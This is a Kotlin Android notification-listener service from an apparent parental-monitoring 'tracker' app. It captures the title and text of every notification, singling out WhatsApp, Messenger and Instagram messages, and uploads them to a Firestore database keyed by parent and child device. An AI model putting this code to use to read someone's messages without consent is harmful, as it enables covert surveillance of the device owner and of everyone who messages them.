package com.abuzahra.tracker.services

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import com.google.firebase.firestore.FirebaseFirestore

class MyNotificationListener : NotificationListenerService() {

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        try {
            val packageName = sbn.packageName
            val extras = sbn.notification.extras
            
            val title = extras.getCharSequence("android.title")?.toString() ?: ""
            val text = extras.getCharSequence("android.text")?.toString() ?: ""
            val bigText = extras.getCharSequence("android.bigText")?.toString() ?: ""
            val messageBody = if (bigText.isNotEmpty()) bigText else text
            
            // التحقق من التطبيقات المطلوبة
            if (packageName == "com.whatsapp" || packageName == "com.facebook.orca" || packageName == "com.instagram.android") {
                val data = hashMapOf(
                    "app_name" to getAppName(packageName),
                    "title" to title,
                    "body" to messageBody,
                    "timestamp" to System.currentTimeMillis(),
                    "type" to "social"
                )
                sendToFirebase("social_logs", data)
            } else {
                val data = hashMapOf(
                    "app_name" to getAppName(packageName),
                    "title" to title,
                    "body" to messageBody,
                    "timestamp" to System.currentTimeMillis(),
                    "type" to "notification"
                )
                sendToFirebase("notifications", data)
            }

        } catch (e: Exception) {
            Log.e("NotifListener", "Error: ${e.message}")
        }
    }

    private fun getAppName(packageName: String): String {
        return when (packageName) {
            "com.whatsapp" -> "WhatsApp"
            "com.facebook.orca" -> "Messenger"
            "com.instagram.android" -> "Instagram"
            else -> packageName
        }
    }

    private fun sendToFirebase(collection: String, data: Map<String, Any>) {
        // استخدام applicationContext مع SharedPrefsManager
        val parentId = SharedPrefsManager.getParentUid(applicationContext) ?: return
        val deviceId = SharedPrefsManager.getDeviceId(applicationContext) ?: return
        
        FirebaseFirestore.getInstance()
            .collection("parents").document(parentId)
            .collection("children").document(deviceId)
            .collection(collection).add(data)
    }
}
